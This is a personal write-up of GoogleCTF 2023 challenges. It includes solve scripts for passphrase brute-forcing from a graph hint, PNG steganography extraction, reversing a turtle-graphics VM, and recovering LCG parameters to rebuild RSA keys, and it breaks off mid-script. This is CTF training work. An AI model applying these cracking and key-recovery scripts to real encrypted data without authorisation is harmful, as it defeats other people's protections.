---
title: GoogleCTF 2023 Writeup
---

# GoogleCTF 2023 Writeup
## Overview
Last weekend, I played GoogleCTF with b01lers. We ranked 55th in the end. I solved 2 misc, 1 rev, 1 crypto, and 3 pwn. This writeup will mostly focus on my own thought process while solving the challenges, and I'd recommand reading the [official writeups](https://github.com/google/google-ctf/tree/master/2023) as well.

Challenge solved after the competition are marked as \[\*\] 

<!--more-->

---

# Misc
## npc
```text
A friend handed me this map and told me that it will lead me to the flag. 
It is confusing me and I don't know how to read it, can you help me out?

solves: 102
```
{% capture npc_encrypt_py %}
```python
# Copyright 2023 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

"""This file encrypts a given file using a generated, easy to remember password.

Additionally, it generates a hint in case you forgot the password.
"""

import dataclasses
import re
import secrets
import sys

from pyrage import passphrase


def get_word_list():
  with open('USACONST.TXT', encoding='ISO8859') as f:
    text = f.read()
  return list(set(re.sub('[^a-z]', ' ', text.lower()).split()))


def generate_password(num_words):
  word_list = get_word_list()
  return ''.join(secrets.choice(word_list) for _ in range(num_words))


@dataclasses.dataclass
class Node:
  letter: str
  id: int


@dataclasses.dataclass
class Edge:
  a: Node
  b: Node


@dataclasses.dataclass
class Graph:
  nodes: list[Node]
  edges: list[Edge]


class IdGen:
  def __init__(self):
    self.ids = set()

  def generate_id(self):
    while True:
      new_id = secrets.randbelow(1024**3)
      if new_id not in self.ids:
        self.ids.add(new_id)
        return new_id


def generate_hint(password):
  random = secrets.SystemRandom()
  id_gen = IdGen()
  graph = Graph([],[])
  for letter in password:
    graph.nodes.append(Node(letter, id_gen.generate_id()))
  for a, b in zip(graph.nodes, graph.nodes[1:]):
    graph.edges.append(Edge(a, b))
  for _ in range(int(len(password)**1.3)):
    a, b = random.sample(graph.nodes, 2)
    graph.edges.append(Edge(a, b))
  random.shuffle(graph.nodes)
  random.shuffle(graph.edges)
  for edge in graph.edges:
    if random.random() % 2:
      edge.a, edge.b = edge.b, edge.a
  return graph

def write_hint(graph, out_file):
  out_file.write('graph {\n')
  for node in graph.nodes:
    out_file.write(f'    {node.id} [label={node.letter}];\n')
  for edge in graph.edges:
    out_file.write(f'    {edge.a.id} -- {edge.b.id};\n')
  out_file.write('}\n')


def encrypt(num_words, secret):
  password = generate_password(num_words)
  hint = generate_hint(password)
  with open('hint.dot', 'w') as hint_file:
    write_hint(hint, hint_file)
  filename = 'secret.age'
  with open(filename, 'wb') as f:
    f.write(passphrase.encrypt(secret, password))
  print(f'Your secret is now inside password-protected file {filename}.')
  print(f'Use the password {password} to access it.')
  print(
      'In case you forgot the password, maybe hint.dot will help your memory.')


if __name__ == '__main__':
  encrypt(num_words=int(sys.argv[1]), secret=sys.argv[2].encode('utf-8'))

```
{% endcapture %}

{% include widgets/toggle-field.html toggle-name="npc_encrypt_py"
    button-text="Show encrypt.py" toggle-text=npc_encrypt_py %}
		
In this challenge, the flag file is encrypted using a passphrase that generated from a wordlist. A `hint.dot` file is also provided. THe most import part is to identiy how the hint is generate. 
In the `encrypt.py` file we can see that each letter is assigned a node, and each consecutive letters are link with a directly edge. Afterward, random edges are added, the node orders are shuffled, and the edge order are randomly flipped. Since there are a lot of randomness in the hint, all we can extract from the hint are what letters are in the passphrase, and what letters can be connected.
I parse the hint file and get the list of letters presented. I then treat all edges as bi-directional, and filter the words based on the following criteria.

1. The letters in the word can be found in the passphrase
2. There are edges between any two consecutive letter pairs

This filters the word list down to 86 words, I then randomly generates passphrase from that wordlist that have the same word sets as the passphrase. I then permutes that word sets and test all permutations until the correct passphrase is found. See solve.py for more detail. 

I think that the word set phase can potentially be change to a more efficient approach, as that problem is similar to a subset sum, not sure if there are any potential in a more efficient algorithm.

`CTF{S3vEn_bR1dg35_0f_K0eN1g5BeRg}`

{% capture npc_solve_py %}
```python
import re
import random
import secrets
from tqdm import tqdm
import string
from sage.all import *
from pyrage import passphrase
from itertools import permutations

def get_word_list():
    with open('USACONST.TXT', encoding='ISO8859') as f:
        text = f.read()
    return list(set(re.sub('[^a-z]', ' ', text.lower()).split()))

word_list = get_word_list()

def get_valid_nodes():
    with open("hint.dot") as f:
        header = f.readline()
        tmp = f.readline()
        nodes = {}
        inv_nodes = {}
        edges = []
        while "label" in tmp:
            node_id, letter = tmp.split('[label=')
            letter = letter[0]
            node_id = int(node_id)
            nodes[node_id] = letter
            if letter in inv_nodes:
                inv_nodes[letter].append(node_id)
            else:
                inv_nodes[letter] = [node_id]

            tmp = f.readline()

        while "--" in tmp:
            fid, tid = tmp.split('--')
            fid = int(fid)
            tid = int(tid[:-2]) # ;\n
            edges.append((fid, tid))
            edges.append((tid, fid)) # since it's randomly flipped, treat as non directional

            tmp = f.readline()

        return nodes, inv_nodes, edges

nodes, inv_nodes, edges = get_valid_nodes()

def path_exist(inv_map, edge, f, t):
    for fr in inv_map[f]:
        for dst in inv_map[t]:
            if (fr, dst) in edge:
                return True
#    print(f, t)
    return False

#print(n, e)



appeared_letter = list(nodes.values())
valid_words = []
for w in word_list:
    if not all(i in appeared_letter for i in w):
        continue

    for l in w:
        if w.count(l) > appeared_letter.count(l):
            break
    else:
        for s, e in zip(w, w[1:]):
            if not path_exist(inv_nodes, edges, s, e):
                break
        else:
            valid_words.append(w)


print(valid_words)
print(len(appeared_letter))
print(len(valid_words))

verify = "".join(sorted(appeared_letter)).strip()
print(verify)
print(type(verify))
password_len = len(verify)

def generate_password(num_words):
  word_list = valid_words
  return ''.join(secrets.choice(word_list) for _ in range(num_words))

def word2vec(word):
    return [word.count(l) for l in string.ascii_lowercase]


#verify = "aacddeeeeegiiinnnoorrrsssstt"

secret = open("secret.age", "rb").read()

for words in Subsets(valid_words):
    password = "".join(words)
    if len(password) != password_len:
        continue
    s_password = "".join(sorted(password))
#    print(s_password)
#    print(type(s_password), type(verify))
    if s_password in verify:
        print(password)
        print(words)

        for ws in permutations(words):
            password = "".join(ws)
            print(password)

            for s, e in zip(password, password[1:]):
                if not path_exist(inv_nodes, edges, s, e):
                    break
            else:
                try:
                    print(passphrase.decrypt(secret, password))
                    print("FOUND!!!!")
                    exit(1)
                except Exception as e:
                    pass
#standardwatersigngivenchosen
#b'CTF{S3vEn_bR1dg35_0f_K0eN1g5BeRg}'

```
{% endcapture %}

{% include widgets/toggle-field.html toggle-name="npc_solve_py"
    button-text="Show solve.py" toggle-text=npc_solve_py %}

## symatrix

{% capture symatrix_parse_py %}
```python
f = open("encoder.c")

source = ["" for i in range(70)]
for line in f:
    if "encoder.py" in line:
#        print(line)
        try:
            line_number = int(line.split(':')[-1].split(" ")[0])
        except Exception:
            continue
#        print(line_number)
        for af in range(5):
            temp = f.readline()
            if "<<<<<" in temp:
                source[line_number] = temp[3:-1].split("#")[0]

with open("encoder.py", "w") as f:
    f.write("\n".join(source))
```
{% endcapture %}


		

{% capture symatrix_encoder_py %}
```python
from PIL import Image
from random import randint
import binascii

def hexstr_to_binstr(hexstr):
    n = int(hexstr, 16)
    bstr = ''
    while n > 0:
        bstr = str(n % 2) + bstr
        n = n >> 1
    if len(bstr) % 8 != 0:
        bstr = '0' + bstr
    return bstr


def pixel_bit(b):
    return tuple((0, 1, b))


def embed(t1, t2):
    return tuple((t1[0] + t2[0], t1[1] + t2[1], t1[2] + t2[2]))


def full_pixel(pixel):
    return pixel[1] == 255 or pixel[2] == 255

print("Embedding file...")

bin_data = open("./flag.txt", 'rb').read()
data_to_hide = binascii.hexlify(bin_data).decode('utf-8')

base_image = Image.open("./original.png")

x_len, y_len = base_image.size
nx_len = x_len * 2

new_image = Image.new("RGB", (nx_len, y_len))

base_matrix = base_image.load()
new_matrix = new_image.load()

binary_string = hexstr_to_binstr(data_to_hide)
remaining_bits = len(binary_string)

nx_len = nx_len - 1
next_position = 0

for i in range(0, y_len):
    for j in range(0, x_len):

        pixel = new_matrix[j, i] = base_matrix[j, i]

        if remaining_bits > 0 and next_position <= 0 and not full_pixel(pixel):
            new_matrix[nx_len - j, i] = embed(pixel_bit(int(binary_string[0])),pixel)
            next_position = randint(1, 17)
            binary_string = binary_string[1:]
            remaining_bits -= 1
        else:
            new_matrix[nx_len - j, i] = pixel
            next_position -= 1


new_image.save("./symatrix.png")
new_image.close()
base_image.close()

print("Work done!")
exit(1)
```
{% endcapture %}



{% capture symatrix_solve_py %}
```python
from PIL import Image
import binascii
from Crypto.Util.number import long_to_bytes

encoded_image = Image.open("./symatrix.png")
x_len, y_len = encoded_image.size

encoded_matrix = encoded_image.load()

center = x_len//2

flag_bits = ""
for i in range(0, y_len):
    for j in range(0, x_len//2):
        if encoded_matrix[j, i] == encoded_matrix[x_len-1-j, i]:
            continue
        else:
            flag_bits += str(encoded_matrix[x_len-1-j, i][2] - encoded_matrix[j, i][2])
#            print(flag_bits)

flag = long_to_bytes(int(flag_bits, 2))
print(flag)
```
{% endcapture %}

```text
The CIA has been tracking a group of hackers who communicate using PNG files embedded with a custom steganography algorithm. 
An insider spy was able to obtain the encoder, but it is not the original code. 
You have been tasked with reversing the encoder file and creating a decoder as soon as possible in order to read the most recent PNG file they have sent.

solves: 110
```
[encoder.c (From googleCTF github)](https://github.com/google/google-ctf/blob/master/2023/misc-symatrix/challenge/encoder.c)

The challenge comes with a large encoder.c file, this seems intimidating initially. However, reading through the code a little bit, we quickly found out that there are part of the original python file written in the comment. Using a simple parser I extracted the python source from encoder.c file. (My parser actually missed a else: line, and I manuelly added that afterward)

{% include widgets/toggle-field.html toggle-name="symatrix_parse_py" button-text="Show parse_c.py" toggle-text=symatrix_parse_py %}
{% include widgets/toggle-field.html toggle-name="symatrix_encoder_py" button-text="Show encoder.py" toggle-text=symatrix_encoder_py %}

Base on the encoder.py file, it's clear that the original image is mirrored, and the flag bit and embedded to the right half of the image. The pixel that are modifyed are always increamented by either (0, 1, 0) or (0, 1, 1), with the formar encoding 0 and the latter encoding 1. To decode the flag, we simply go through all the bytes, and extract those that are different left side v.s. right side. We can ignore the random offset since only the pixels that have data encoded are changed.

`CTF{W4ke_Up_Ne0+Th1s_I5_Th3_Fl4g!}`

{% include widgets/toggle-field.html toggle-name="symatrix_solve_py" button-text="Show solve.py" toggle-text=symatrix_solve_py %}




---
# Reverse
## Turtle
```text
Are we not all but turtles drifting in the sea, executing instructions as we stumble upon them?

solves: 27
```

[turt.py (From googleCTF github)](https://github.com/google/google-ctf/blob/master/2023/rev-turtle/attachments/turt.py)

This is a vm implemented using turtles! After watching the program run for a bit, we can observe what each turtle are responsible for. For example, the S turtle act like a stack, C is like code, and R is like some registers. Based on this knowledge, I write a translator (translate.py) from `c.png` "code" file to get a pseudocode (trans.txt) of the program. I notice that each 5 pixel movement for the turtle seems to be for 1 unit, so I translate a lot of the moving instructions into pointer arithmatic, as they are easier to work with. 

With the translated pseudocode, we notice that the program first check for the flag format, then make sure all characters are unique, make sure the characters are in a specific order, and lastly run some function on each character.

It took a while to understand that the function is actually a binary search on the character value, and match each step with some value in memory. For example, if the target value is smallar than the current middle element, we first match if the memory value is 1, then call the same search function recursively. To recover the flag, I extract the reference value, take all the found characters, and order it using the reording in the memory. See `simplify.txt` for notes taken during the process, and `solve.py` for more detail.

`CTF{iT5_E-tUr+1es/AlL.7h3;waY:d0Wn}`


{% capture tutle_translate_py %}
```python
from Crypto.Util.number import long_to_bytes, bytes_to_long
from sage.all import *
from PIL import Image


# M: Memory
# S: Stack
# R: Register
def loadM(flag):
    global M
    M = [(ord(i), 0, 0) for i in flag] + [(0, 0, 0) for i in range(200)]

def readM(a):
    return f"M[{a}]"

def writeM(a, c):
    print(f"M[{a}] = {c}")


sp = 0
def loadS():
    global S
    S = [(255, 128, 128) for i in range(240)]
    sp = 120

def readS(a):
    return f"S[sp+{a}]"

def writeS(a, c):
    print(f"S[sp+{a}] = {c}")

def loadR():
    global R
    R = [(0, 0, 0) for i in range(9)]

def readR(a):
    return f"R[{a}]"

def writeR(a, c):
    print(f"R[{a}] = {c}")

def readRVal(rNum):
  return readC(readR(rNum))

def getRNum(colorOrInt):
  if type(colorOrInt) == tuple:
    colorOrInt = colorOrInt[0]
  return (colorOrInt-20) // 40

def read(op, isR, isP, isC):
  if isP:
    return readPVal(op, isR, isC)
  elif isR:
    return readRVal(getRNum(op))
  elif isC:
    return readC(op)
  raise BaseException("invalid insn")

def write(op, val, isR, isP, isC):
  if isP:
    writePVal(op, val, isR, isC)
  elif isR:
    writeRVal(getRNum(op), val)
  else:
    raise BaseException("invalid insn")

def writeRVal(rNum, val):
  writeR(rNum, cToColor(val))

def writePVal(op, val, isS, isC):
  a = readPA(op, isC)
  if isS:
    writeS(a, cToColor(val))
  else:
    writeM(a, cToColor(val))

def readPVal(op, isS, isC):
    a = readPA(op, isC)
    if isS:
        return readC(readS(a))
    else:
        return readC(readM(a))

def readPA(op, isC):
  if isC:
    return readC(op)
  a = ""
  if op[0] != 0:
    a = readRVal(getRNum(op[0])) + " + "
  if op[1] != 0:
    a += readRVal(getRNum(op[1])) + " + "
  a += readOneByteC(op[2])
  return a

def readC(op):
  if type(op) == str:
      return op
  c = op[0] + (op[1]<<8) + (op[2]<<16)
  if c >= (256**3)//2:
    c = -((256**3)-c)
  return str(c)

def readOneByteC(val):
  if val > 256//2:
    return str(-(256-val))
  return str(val)

def cToColor(val):
  return f"{val}"
  if val < 0:
    val = 256**3 + val
  return [val%256, (val>>8)%256, (val>>16)%256]

im = Image.open("c.png").convert("RGB")
w, h = im.size
#print(w, h)
px = im.load()
C = [[px[i, j] for i in range(3)] for j in range(h)]
C+= [[px[i, j] for i in range(3, 6)] for j in range(h)]
C+= [[px[i, j] for i in range(6, 9)] for j in range(h)]
#print(C)

im = Image.open("m.png").convert("RGB")
w, h = im.size
#print(w, h)
px = im.load()
M = [px[j, i] for i in range(h) for j in range(w)]
print([i[0] for i in M[65:95]])
print([i[0] for i in M[95:]])


#print(C)

ip = 0
def run():
    global sp
    for ip in range(h*3):
        print(f"<{ip:04d}>: ", end="")
        color0 = C[ip][0]
        cmpcolor = (color0[0]&0xfc, color0[1]&0xfc, color0[2]&0xfc)
        color1 = C[ip][1]
        color2 = C[ip][2]

        isR1 = color0[0]&1 != 0
        isP1 = color0[1]&1 != 0
        isC1 = color0[2]&1 != 0
        isR2 = color0[0]&2 != 0
        isP2 = color0[1]&2 != 0

ip = 0
def run():
    global sp
    for ip in range(h*3):
        print(f"<{ip:04d}>: ", end="")
        color0 = C[ip][0]
        cmpcolor = (color0[0]&0xfc, color0[1]&0xfc, color0[2]&0xfc)
        color1 = C[ip][1]
        color2 = C[ip][2]

        isR1 = color0[0]&1 != 0
        isP1 = color0[1]&1 != 0
        isC1 = color0[2]&1 != 0
        isR2 = color0[0]&2 != 0
        isP2 = color0[1]&2 != 0
        isC2 = color0[2]&2 != 0

        if cmpcolor == (0,252,0):
            print("print('correct flag!')")
        elif cmpcolor == (252,0,0):
            print("print('wrong flag :C')")
        elif cmpcolor == (204, 204, 252):
            print(f"sp += {readC(color1)}")
        elif cmpcolor == (220, 252, 0) or cmpcolor == (252, 188, 0) or cmpcolor == (64, 224, 208) or cmpcolor == (156, 224, 188) or cmpcolor == (100, 148, 236) or cmpcolor == (252, 124, 80):
            if cmpcolor == (252, 188, 0):
                val2 = readPA(color2, isC2)
            else:
                val2 = read(color2, isR2, isP2, isC2)

            if cmpcolor == (220, 252, 0) or cmpcolor == (252, 188, 0):
                write(color1, val2, isR1, isP1, isC1)
            elif cmpcolor == (64, 224, 208):
                val1 = read(color1, isR1, isP1, isC1)
                write(color1, val1+" + "+val2, isR1, isP1, isC1)
            elif cmpcolor == (156, 224, 188):
                val1 = read(color1, isR1, isP1, isC1)
                write(color1, val1+" - "+val2, isR1, isP1, isC1)
            elif cmpcolor == (100, 148, 236):
                val1 = read(color1, isR1, isP1, isC1)
                write(color1, val1+">>"+val2, isR1, isP1, isC1)
            elif cmpcolor == (252, 124, 80):
                val1 = read(color1, isR1, isP1, isC1)
                print(f"cmp {val1} {val2}")
#                writeRVal(6, 16581630 if (val1 == val2) else 0)
#                writeRVal(7, 16581630 if (val1 < val2) else 0)
#                writeRVal(8, 16581630 if (val1 > val2) else 0)
        elif cmpcolor == (220, 48, 96):
#            e = readRVal(6)
#            l = readRVal(7)
#            g = readRVal(8)
            op = "j"
            if color0[0]&2 != 0:
                op+= "l"
            if color0[1]&2 != 0:
                op+= "g"
            if color0[0]&1 != 0:
                op+= "e"
            if color0[1]&1 != 0:
                op+= "ne"

            if op == "jlgene":
                op = "jmp"

            dest = f"{op} {ip}+{readC(color1)}-1"
            offset = f"{ip} + {readC(color1)}-1"
            try:
                offset_num = eval(offset)
                print(f"{op} <{offset_num:04d}>")
            except:
                print(dest)

        elif cmpcolor == (252, 0, 252):
            jmp = ((color1[0])//3)*h - color1[1] - 1
            print(f"call <{ip+jmp:04d}>")
#            writeS(0, (color1[0], color1[1], 127))
        elif cmpcolor == (128, 0, 128):
            print("ret")
        else:
            print()

run()
```
{% endcapture %}

{% include widgets/toggle-field.html toggle-name="tutle_translate_py"
    button-text="Show translate.py" toggle-text=tutle_translate_py %}
		
		
{% capture turtle_trans_txt %}
```txt
<0000>: sp += -83
<0001>: R[2] = M[0]
<0002>: cmp R[2] 67
<0003>: jne <0015>
<0004>: R[2] = M[1]
<0005>: cmp R[2] 84
<0006>: jne <0015>
<0007>: R[2] = M[2]
<0008>: cmp R[2] 70
<0009>: jne <0015>
<0010>: R[2] = M[3]
<0011>: cmp R[2] 123
<0012>: jne <0015>
<0013>: R[2] = M[34]
<0014>: cmp R[2] 125
<0015>: je <0016>
<0016>: print('wrong flag :C')
<0017>: S[sp+1] = 0
<0018>: cmp S[sp+1] 79
<0019>: jg <0023>
<0020>: R[2] = S[sp+1]
<0021>: S[sp+R[2] + 3] = 0
<0022>: S[sp+1] = S[sp+1] + 1
<0023>: jmp <0017>
<0024>: S[sp+2] = 4
<0025>: R[2] = S[sp+2]
<0026>: cmp R[2] 28
<0027>: jg <0053>
<0028>: R[2] = S[sp+2]
<0029>: R[5] = 0
<0030>: R[2] = M[R[2] + R[5] + 0]
<0031>: cmp R[2] 42
<0032>: jle <0037>
<0033>: R[2] = S[sp+2]
<0034>: R[5] = 0
<0035>: R[2] = M[R[2] + R[5] + 0]
<0036>: cmp R[2] 122
<0037>: jle <0038>
<0038>: print('wrong flag :C')
<0039>: R[2] = S[sp+2]
<0040>: R[5] = 0
<0041>: R[2] = M[R[2] + R[5] + 0]
<0042>: R[2] = R[2] - 43
<0043>: R[2] = S[sp+R[2] + 3]
<0044>: cmp R[2] 65535
<0045>: jne <0046>
<0046>: print('wrong flag :C')
<0047>: R[2] = S[sp+2]
<0048>: R[5] = 0
<0049>: R[2] = M[R[2] + R[5] + 0]
<0050>: R[2] = R[2] - 43
<0051>: S[sp+R[2] + 3] = 65535
<0052>: S[sp+2] = S[sp+2] + 1
<0053>: jmp <0024>
<0054>: call <0082>
<0055>: M[519] = 0
<0056>: S[sp+0] = 43
<0057>: cmp S[sp+0] 122
<0058>: jg <0067>
<0059>: R[2] = S[sp+0]
<0060>: R[5] = 30
<0061>: R[0] = 35
<0062>: R[1] = R[2]
<0063>: call <0165>
<0064>: R[2] = S[sp+0]
<0065>: R[2] = R[2] + 1
<0066>: S[sp+0] = R[2]
<0067>: jmp <0056>
<0068>: print('correct flag!')
<0069>:
<0070>:
<0071>:
<0072>:
<0073>:
<0074>:
<0075>:
<0076>:
<0077>:
<0078>:
<0079>:
<0080>:
<0081>:
<0082>:
<0083>: R[2] = 4
<0084>: S[sp+-2] = R[2]
<0085>: S[sp+-3] = 0
<0086>: R[2] = S[sp+-3]
<0087>: cmp R[2] 29
<0088>: jg <0100>
<0089>: R[2] = S[sp+-3]
<0090>: R[5] = R[2]
<0091>: R[2] = S[sp+-2]
<0092>: R[5] = R[5] + R[2]
<0093>: R[2] = S[sp+-3]
<0094>: R[4] = 65
<0095>: R[2] = M[R[2] + R[4] + 0]
<0096>: R[5] = M[R[5] + 0]
<0097>: R[4] = 35
<0098>: M[R[2] + R[4] + 0] = R[5]
<0099>: S[sp+-3] = S[sp+-3] + 1
<0100>: jmp <0085>
<0101>: ret
<0102>:
<0103>:
<0104>:
<0105>:
<0106>:
<0107>:
<0108>:
<0109>:
<0110>:
<0111>:
<0112>:
<0113>:
<0114>:
<0115>:
<0116>:
<0117>:
<0118>:
<0119>:
<0120>:
<0121>:
<0122>:
<0123>:
<0124>:
<0125>:
<0126>:
<0127>:
<0128>:
<0129>:
<0130>:
<0131>:
<0132>:
<0133>:
<0134>:
<0135>:
<0136>:
<0137>:
<0138>:
<0139>:
<0140>:
<0141>:
<0142>:
<0143>:
<0144>:
<0145>:
<0146>:
<0147>:
<0148>:
<0149>:
<0150>:
<0151>:
<0152>:
<0153>:
<0154>:
<0155>:
<0156>:
<0157>:
<0158>:
<0159>:
<0160>:
<0161>:
<0162>:
<0163>:
<0164>:
<0165>:
<0166>: sp += -4
<0167>: R[4] = R[1]
<0168>: S[sp+0] = R[0]
<0169>: R[2] = R[5]
<0170>: R[5] = R[4]
<0171>: S[sp+2] = R[5]
<0172>: S[sp+1] = R[2]
<0173>: R[2] = M[519]
<0174>: cmp R[2] 424
<0175>: jne <0176>
<0176>: print('wrong flag :C')
<0177>: cmp S[sp+1] 0
<0178>: jne <0186>
<0179>: R[2] = M[519]
<0180>: R[5] = R[2] + 1
<0181>: M[519] = R[5]
<0182>: R[5] = 95
<0183>: R[2] = M[R[2] + R[5] + 0]
<0184>: cmp R[2] 4
<0185>: je <0246>
<0186>: print('wrong flag :C')
<0187>: R[2] = S[sp+1]
<0188>: R[2] = R[2] - 1
<0189>: R[2] = R[2]>>1
<0190>: S[sp+3] = R[2]
<0191>: R[5] = S[sp+3]
<0192>: R[2] = S[sp+0]
<0193>: R[2] = R[2] + R[5]
<0194>: R[2] = M[R[2] + 0]
<0195>: cmp S[sp+2] R[2]
<0196>: jge <0211>
<0197>: R[2] = M[519]
<0198>: R[5] = R[2] + 1
<0199>: M[519] = R[5]
<0200>: R[5] = 95
<0201>: R[2] = M[R[2] + R[5] + 0]
<0202>: cmp R[2] 1
<0203>: je <0204>
<0204>: print('wrong flag :C')
<0205>: R[5] = S[sp+3]
<0206>: R[2] = S[sp+2]
<0207>: R[4] = S[sp+0]
<0208>: R[0] = R[4]
<0209>: R[1] = R[2]
<0210>: call <0165>
<0211>: jmp <0246>
<0212>: R[5] = S[sp+3]
<0213>: R[2] = S[sp+0]
<0214>: R[2] = R[2] + R[5]
<0215>: R[2] = M[R[2] + 0]
<0216>: cmp S[sp+2] R[2]
<0217>: jle <0238>
<0218>: R[2] = M[519]
<0219>: R[5] = R[2] + 1
<0220>: M[519] = R[5]
<0221>: R[5] = 95
<0222>: R[2] = M[R[2] + R[5] + 0]
<0223>: cmp R[2] 2
<0224>: je <0225>
<0225>: print('wrong flag :C')
<0226>: R[2] = S[sp+1]
<0227>: R[2] = R[2] - S[sp+3]
<0228>: R[2] = R[2] - 1
<0229>: R[5] = R[2]
<0230>: R[2] = S[sp+3]
<0231>: R[4] = R[2] + 1
<0232>: R[2] = S[sp+0]
<0233>: R[4] = R[4] + R[2]
<0234>: R[2] = S[sp+2]
<0235>: R[0] = R[4]
<0236>: R[1] = R[2]
<0237>: call <0165>
<0238>: jmp <0246>
<0239>: R[2] = M[519]
<0240>: R[5] = R[2] + 1
<0241>: M[519] = R[5]
<0242>: R[5] = 95
<0243>: R[2] = M[R[2] + R[5] + 0]
<0244>: cmp R[2] 3
<0245>: je <0246>
<0246>: print('wrong flag :C')
<0247>: sp += 4
<0248>: ret
```
{% endcapture %}

{% include widgets/toggle-field.html toggle-name="turtle_trans_txt"
    button-text="Show trans.txt" toggle-text=turtle_trans_txt %}
		
{% capture turtle_simplify_py %}
```python
M[0] = 67
M[1] = 84
M[2] = 70
M[3] = 123
M[4] = 125
for i in range(80):
        S[sp+i+3] = 0

len = 80

for j in range(4, 29):
        #M[j] in {42, 122}
        #all letter in this set is unique

for j in range(29):
        res = [0 for i in range(30)]
        shuffle = [23, 14, 7, 18, 12, 1, 28, 15, 26, 0, 5, 21, 27, 3, 11, 24, 13, 2, 8, 22, 6, 10, 29, 19, 17, 9, 20, 4, 16, 25]
        res[shuffle[j]] = M[j+4]

t = 0
def check(a, b, c):
        if t==424:
                print('wrong flag :target')
        if len == 0:
                R[2] = M[t + 95]
                t = t + 1
                if R[2] == 4:
                        return
                else:
                        print('wrong flag :target')

        mid_len = (len-1)//2
        mid_point = st + mid_len
        if target < M[mid_point]:
                R[2] = M[t + 95]
                t = t + 1
                if R[2] == 1:
                        return
                else:
                        print('wrong flag :target')

                check(st, target, mid_len)

        elif target > M[mid_point]:
                R[2] = M[t + 95]
                t = t + 1
                if R[2] == 2:
                        return
                else:
                        print('wrong flag :target')

                check(st+mid_len+1, target, len - mid_len - 1)

        else:
                R[2] = M[t + 95]
                t = t + 1
                if R[2] == 3:
                        return
                else:
                        print('wrong flag :target')
        return


for i in range(43, 122):
        check(35, i, 30) #R0, R1, R5
```
{% endcapture %}

{% include widgets/toggle-field.html toggle-name="turtle_simplify_py"
    button-text="Show simplify.txt" toggle-text=turtle_simplify_py%}

{% capture turtle_solve_py %}
```python
from PIL import Image

im = Image.open("m.png").convert("RGB")
w, h = im.size
#print(w, h)
px = im.load()
M = [px[j, i] for i in range(h) for j in range(w)]
ordering = [i[0] for i in M[65:95]]
finding = [i[0] for i in M[95:95+424]]

chars = [i for i in range(43, 123)]
finding = [4-i for i in finding if i in [3, 4]]

flag = ""
for i in range(len(chars)):
    if finding[i] == 1:
        flag+=chr(chars[i])

flag = "".join([flag[i] for i in ordering])
print("CTF{"+flag+"}")
```
{% endcapture %}

{% include widgets/toggle-field.html toggle-name="turtle_solve_py"
    button-text="Show solve.py" toggle-text=turtle_solve_py%}

---
# Crypto
## Least Common Genominator?
```text
Someone used this program to send me an encrypted message but I can't read it! It uses something called an LCG, do you know what it is? I dumped the first six consecutive values generated from it but what do I do with it?!

solves: 352
```
{% capture lcg_generator_py %}
```python
from secret import config
from Crypto.PublicKey import RSA
from Crypto.Util.number import bytes_to_long, isPrime

class LCG:
    lcg_m = config.m
    lcg_c = config.c
    lcg_n = config.n

    def __init__(self, lcg_s):
        self.state = lcg_s

    def next(self):
        self.state = (self.state * self.lcg_m + self.lcg_c) % self.lcg_n
        return self.state

if __name__ == '__main__':

    assert 4096 % config.it == 0
    assert config.it == 8
    assert 4096 % config.bits == 0
    assert config.bits == 512

    # Find prime value of specified bits a specified amount of times
    seed = 211286818345627549183608678726370412218029639873054513839005340650674982169404937862395980568550063504804783328450267566224937880641772833325018028629959635
    lcg = LCG(seed)
    primes_arr = []

    dump = True
    items = 0
    dump_file = open("dump.txt", "w")

    primes_n = 1
    while True:
        for i in range(config.it):
            while True:
                prime_candidate = lcg.next()
                if dump:
                    dump_file.write(str(prime_candidate) + '\n')
                    items += 1
                    if items == 6:
                        dump = False
                        dump_file.close()
                if not isPrime(prime_candidate):
                    continue
                elif prime_candidate.bit_length() != config.bits:
                    continue
                else:
                    primes_n *= prime_candidate
                    primes_arr.append(prime_candidate)
                    break

        # Check bit length
        if primes_n.bit_length() > 4096:
            print("bit length", primes_n.bit_length())
            primes_arr.clear()
            primes_n = 1
            continue
        else:
            break

    # Create public key 'n'
    n = 1
    for j in primes_arr:
        n *= j
    print("[+] Public Key: ", n)
    print("[+] size: ", n.bit_length(), "bits")

    # Calculate totient 'Phi(n)'
    phi = 1
    for k in primes_arr:
        phi *= (k - 1)

    # Calculate private key 'd'
    d = pow(config.e, -1, phi)

    # Generate Flag
    assert config.flag.startswith(b"CTF{")
    assert config.flag.endswith(b"}")
    enc_flag = bytes_to_long(config.flag)
    assert enc_flag < n

    # Encrypt Flag
    _enc = pow(enc_flag, config.e, n)

    with open ("flag.txt", "wb") as flag_file:
        flag_file.write(_enc.to_bytes(n.bit_length(), "little"))

    # Export RSA Key
    rsa = RSA.construct((n, config.e))
    with open ("public.pem", "w") as pub_file:
        pub_file.write(rsa.exportKey().decode())
```
{% endcapture %}

{% include widgets/toggle-field.html toggle-name="lcg_generator_py"
    button-text="Show generator.py" toggle-text=lcg_generator_py %}
		
This challenge is first generates p and q using a lcg, then use the p and q generated to encrypted the flag using rsa. Notice that the seed for lcg is provided, and the first 6 output of the lcg is provided. Therefore, if we recover the parameters for lcg, we can re-generate the same p and q from the program, and decrypt rsa accordingly. 

While recovering m and c is trivial, recovering n is harder. I found [this script](https://github.com/jvdsn/crypto-attacks/blob/master/attacks/lcg/parameter_recovery.py) and modify it a bit since the modulus end up not being a prime. After recoving the parameters, the rest of the solve are straight forward.

`CTF{C0nGr@tz_RiV35t_5h4MiR_nD_Ad13MaN_W0ulD_b_h@pPy}`

{% capture lcg_solve_py %}
```python
from math import gcd
from sage.all import GF, Zmod
from sage.all import is_prime_power
from Crypto.PublicKey import RSA
from Crypto.Util.number import bytes_to_long, isPrime, long_to_bytes

# https://github.com/jvdsn/crypto-attacks/blob/master/attacks/lcg/parameter_recovery.py
# with some modification
def attack(y, m=None, a=None, c=None):
    """
    Recovers the parameters from a linear congruential generator.
    If no modulus is provided, attempts to recover the modulus from the outputs (may require many outputs).
    If no multiplier is provided, attempts to recover the multiplier from the outputs (requires at least 3 outputs).
    If no increment is provided, attempts to recover the increment from the outputs (requires at least 2 outputs).
    :param y: the sequential output values obtained from the LCG
    :param m: the modulus of the LCG (can be None)
    :param a: the multiplier of the LCG (can be None)
